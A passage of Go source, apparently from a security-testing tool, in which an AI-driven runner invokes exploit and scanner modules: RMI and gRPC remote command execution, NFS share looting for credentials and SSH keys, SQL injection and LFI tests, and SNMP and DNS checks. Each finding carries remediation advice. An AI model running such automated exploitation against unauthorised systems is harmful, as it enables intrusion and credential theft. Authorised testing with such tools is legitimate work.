		if output, ok := result.Data["output"].(string); ok && output != "" {
			evidence.WriteString(fmt.Sprintf("Command Output:\n%s\n", output))
		}
		if sysInfo, ok := result.Data["system_info"].(string); ok && sysInfo != "" {
			evidence.WriteString(fmt.Sprintf("System Info:\n%s\n", sysInfo))
		}
		if secrets, ok := result.Data["secrets"].(string); ok && secrets != "" {
			evidence.WriteString(fmt.Sprintf("Exposed Secrets:\n%s\n", secrets))
		}

		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "java_rmi_rce",
			Severity:    "critical",
			Target:      fmt.Sprintf("%s:%s", host, port),
			Service:     "java-rmi",
			Description: "Java RMI service vulnerable to remote code execution and information disclosure",
			Evidence:    evidence.String(),
			Remediation: "Restrict RMI access to trusted networks only. Remove dangerous remote methods. Implement authentication. Update Java to latest version to prevent deserialization attacks.",
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
		}
	}

	return action, nil
}

func (r *AutoRunner) actionRPCBindScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = r.state.Target
	}

	host := target
	port := "111"
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		host = parts[0]
		port = parts[1]
	}

	module := exploit.NewRPCBindScanner()
	module.SetOption("RHOSTS", host)
	module.SetOption("RPORT", port)

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("RPCBind scan error: %v", err)
		action.Success = false
		return action, nil
	}

	action.Result = result.Output
	action.Success = result.Success

	// Build evidence from scan results
	var evidence strings.Builder
	evidence.WriteString("RPCBind/Portmapper Enumeration\n")
	evidence.WriteString(fmt.Sprintf("Target: %s:%s\n", host, port))

	if services, ok := result.Data["services"].([]string); ok && len(services) > 0 {
		evidence.WriteString("Registered RPC Services:\n")
		for _, svc := range services {
			evidence.WriteString(fmt.Sprintf("  - %s\n", svc))
		}
	}

	// Check for NFS exports with wildcard access
	if nfsExports, ok := result.Data["nfs_exports"].(string); ok {
		evidence.WriteString(fmt.Sprintf("NFS Exports:\n%s\n", nfsExports))
		if strings.Contains(nfsExports, "*") {
			r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
				Type:        "nfs_world_accessible",
				Severity:    "high",
				Target:      fmt.Sprintf("%s:%s", host, port),
				Service:     "nfs/rpcbind",
				Description: "NFS exports accessible to everyone (*) - allows unauthorized file access",
				Evidence:    evidence.String(),
				Remediation: "Restrict NFS exports to specific IP addresses or subnets. Remove wildcard (*) access. Implement proper authentication with Kerberos.",
				Timestamp:   time.Now(),
			})

			if r.callbacks.OnFinding != nil {
				r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
			}
		}
	}

	return action, nil
}

func (r *AutoRunner) actionNFSExploit(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = r.state.Target
	}

	host := target
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		host = parts[0]
	}

	module := exploit.NewNFSExploit()
	module.SetOption("RHOSTS", host)

	if export := getOpt(decision.Options, "export"); export != "" {
		module.SetOption("EXPORT", export)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("NFS exploit error: %v", err)
		action.Success = false
		return action, nil
	}

	action.Result = result.Output
	action.Success = result.Success

	// Build evidence from NFS exploitation
	var evidence strings.Builder
	evidence.WriteString("NFS Share Exploitation\n")
	evidence.WriteString(fmt.Sprintf("Target: %s\n", host))

	if exports, ok := result.Data["exports"].([]string); ok && len(exports) > 0 {
		evidence.WriteString("Accessible Exports:\n")
		for _, exp := range exports {
			evidence.WriteString(fmt.Sprintf("  - %s\n", exp))
		}
	}

	// Capture any SSH keys or credentials found
	var filesFound []string
	for _, cred := range result.Credentials {
		cf := CredentialFind{
			Username: cred.Username,
			Password: cred.Hash,
			Service:  "nfs",
			Target:   target,
		}
		r.state.Credentials = append(r.state.Credentials, cf)
		filesFound = append(filesFound, fmt.Sprintf("%s: %s", cred.Type, cred.Username))

		if r.callbacks.OnCredential != nil {
			r.callbacks.OnCredential(cf)
		}
	}

	if len(filesFound) > 0 {
		evidence.WriteString("Sensitive Files Retrieved:\n")
		for _, f := range filesFound {
			evidence.WriteString(fmt.Sprintf("  - %s\n", f))
		}
	}

	if files, ok := result.Data["files"].([]string); ok && len(files) > 0 {
		evidence.WriteString("Files Found on Share:\n")
		for _, f := range files {
			evidence.WriteString(fmt.Sprintf("  - %s\n", f))
		}
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "nfs_data_exposure",
			Severity:    "critical",
			Target:      host,
			Service:     "nfs",
			Description: "NFS share accessible without authentication - sensitive data exposed including potential SSH keys and configuration files",
			Evidence:    evidence.String(),
			Remediation: "Restrict NFS exports to authorized hosts only. Implement NFSv4 with Kerberos authentication. Remove sensitive files from shared directories. Use proper file permissions.",
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
		}
	}

	return action, nil
}

func (r *AutoRunner) actionGRPCExploit(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = r.state.Target
	}

	host := target
	port := "50051"
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		host = parts[0]
		port = parts[1]
	}

	module := exploit.NewGRPCExploit()
	module.SetOption("RHOSTS", host)
	module.SetOption("RPORT", port)

	if cmd := getOpt(decision.Options, "cmd"); cmd != "" {
		module.SetOption("CMD", cmd)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("gRPC exploit error: %v", err)
		action.Success = false
		return action, nil
	}

	action.Result = result.Output
	action.Success = result.Success

	if result.Success {
		// Build evidence from gRPC exploitation
		var evidence strings.Builder
		evidence.WriteString("gRPC Service Remote Code Execution\n")
		evidence.WriteString(fmt.Sprintf("Endpoint: %s:%s\n", host, port))

		if services, ok := result.Data["services"].([]string); ok && len(services) > 0 {
			evidence.WriteString("Exposed Services:\n")
			for _, svc := range services {
				evidence.WriteString(fmt.Sprintf("  - %s\n", svc))
			}
		}
		if output, ok := result.Data["output"].(string); ok && output != "" {
			evidence.WriteString(fmt.Sprintf("Command Execution Output:\n%s\n", output))
		}
		if methods, ok := result.Data["methods"].([]string); ok && len(methods) > 0 {
			evidence.WriteString("Exposed Methods:\n")
			for _, m := range methods {
				evidence.WriteString(fmt.Sprintf("  - %s\n", m))
			}
		}

		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "grpc_command_injection",
			Severity:    "critical",
			Target:      fmt.Sprintf("%s:%s", host, port),
			Service:     "grpc",
			Description: "gRPC service allows unauthenticated remote command execution",
			Evidence:    evidence.String(),
			Remediation: "Implement gRPC authentication using TLS client certificates or token-based auth. Remove dangerous service methods. Enable gRPC reflection only in development environments.",
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
		}
	}

	return action, nil
}

func (r *AutoRunner) actionMSRPCScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = r.state.Target
	}

	host := target
	port := "135"
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		host = parts[0]
		port = parts[1]
	}

	module := exploit.NewMSRPCScanner()
	module.SetOption("RHOSTS", host)
	module.SetOption("RPORT", port)

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("MS-RPC scan error: %v", err)
		action.Success = false
		return action, nil
	}

	action.Result = result.Output
	action.Success = result.Success

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "msrpc_exposed",
			Severity:    "medium",
			Target:      target,
			Description: "MS-RPC endpoint mapper exposed - potential attack surface",
			Timestamp:   time.Now(),
		})
	}

	return action, nil
}

// ============================================================================
// NEW CURIOUS MODULES - MCP-based implementations
// ============================================================================

func (r *AutoRunner) actionDirBruteforce(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = fmt.Sprintf("http://%s", r.state.Target)
	}
	// Ensure URL format
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}

	result := r.framework.ExploitDB.DirBruteforce(target, "common", "")

	action.Result = result.Output
	action.Success = result.Success

	// Parse for found paths
	if strings.Contains(result.Output, "[FOUND]") || strings.Contains(result.Output, "[200 OK]") {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "exposed_paths",
			Severity:    "medium",
			Target:      target,
			Description: "Exposed directories/files discovered via bruteforce",
			Evidence:    result.Output,
			Timestamp:   time.Now(),
		})
	}

	return action, nil
}

func (r *AutoRunner) actionSQLiTest(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = fmt.Sprintf("http://%s", r.state.Target)
	}
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}

	result := r.framework.ExploitDB.SQLiTest(target)

	action.Result = result.Output
	action.Success = result.Success

	if strings.Contains(result.Output, "[VULNERABLE]") || strings.Contains(result.Output, "[CRITICAL]") {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "sql_injection",
			Severity:    "critical",
			Target:      target,
			Description: "SQL Injection vulnerability detected",
			Evidence:    result.Output,
			Remediation: "Use parameterized queries and prepared statements",
			Timestamp:   time.Now(),
		})
	}

	return action, nil
}

func (r *AutoRunner) actionLFITest(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = fmt.Sprintf("http://%s", r.state.Target)
	}
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}

	result := r.framework.ExploitDB.LFITest(target, "")

	action.Result = result.Output
	action.Success = result.Success

	if strings.Contains(result.Output, "[VULNERABLE]") || strings.Contains(result.Output, "[CRITICAL]") {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "lfi",
			Severity:    "critical",
			Target:      target,
			Description: "Local File Inclusion vulnerability detected",
			Evidence:    result.Output,
			Remediation: "Never include files based on user input, use whitelists",
			Timestamp:   time.Now(),
		})
	}

	return action, nil
}

func (r *AutoRunner) actionLDAPCheck(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := extractHost(decision.Target)
	if target == "" {
		target = r.state.Target
	}

	result := r.framework.ExploitDB.CheckLDAP(target, 389)

	action.Result = result.Output
	action.Success = result.Success

	if strings.Contains(result.Output, "[CRITICAL]") {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "ldap_anonymous",
			Severity:    "critical",
			Target:      target,
			Description: "LDAP allows anonymous bind - can enumerate users/groups",
			Evidence:    result.Output,
			Remediation: "Disable anonymous LDAP binds",
			Timestamp:   time.Now(),
		})
	}

	return action, nil
}

func (r *AutoRunner) actionSNMPCheck(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := extractHost(decision.Target)
	if target == "" {
		target = r.state.Target
	}

	result := r.framework.ExploitDB.CheckSNMP(target, "public,private")

	action.Result = result.Output
	action.Success = result.Success

	if strings.Contains(result.Output, "[CRITICAL]") {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "snmp_default_community",
			Severity:    "high",
			Target:      target,
			Description: "SNMP accessible with default community strings",
			Evidence:    result.Output,
			Remediation: "Use SNMPv3 with authentication, change community strings",
			Timestamp:   time.Now(),
		})
	}

	return action, nil
}

func (r *AutoRunner) actionSubdomainScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	domain := decision.Target
	if domain == "" {
		domain = r.state.Target
	}
	// Remove any protocol prefix
	domain = strings.TrimPrefix(domain, "http://")
	domain = strings.TrimPrefix(domain, "https://")
	domain = strings.Split(domain, "/")[0]
	domain = strings.Split(domain, ":")[0]

	result := r.framework.ExploitDB.SubdomainEnum(domain, "small")

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

func (r *AutoRunner) actionDNSZoneTransfer(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	domain := decision.Target
	if domain == "" {
		domain = r.state.Target
	}
	domain = strings.TrimPrefix(domain, "http://")
	domain = strings.TrimPrefix(domain, "https://")
	domain = strings.Split(domain, "/")[0]
	domain = strings.Split(domain, ":")[0]

	result := r.framework.ExploitDB.DNSZoneTransfer(domain, "")

	action.Result = result.Output
	action.Success = result.Success

	if strings.Contains(result.Output, "[CRITICAL]") {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "dns_zone_transfer",
			Severity:    "high",
			Target:      domain,
			Description: "DNS zone transfer allowed - full DNS enumeration possible",
			Evidence:    result.Output,
			Remediation: "Restrict zone transfers to authorized secondary DNS servers only",
			Timestamp:   time.Now(),
		})
	}

	return action, nil
}

func (r *AutoRunner) actionBannerGrab(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = r.state.Target
	}

	host, port := extractHostAndPort(target)
	if host == "" {
		host = r.state.Target
	}
	if port == 0 {
		port = 80
	}

	result := r.framework.ExploitDB.GrabBanner(host, port)

	action.Result = result.Output
	action.Success = result.Success

	// Update service info if banner contains version
	if result.Success && result.Output != "" {
		for i, svc := range r.state.Services {
			if svc.Host == host && svc.Port == port {
				r.state.Services[i].Banner = result.Output
				break
			}
		}
	}

	return action, nil
}
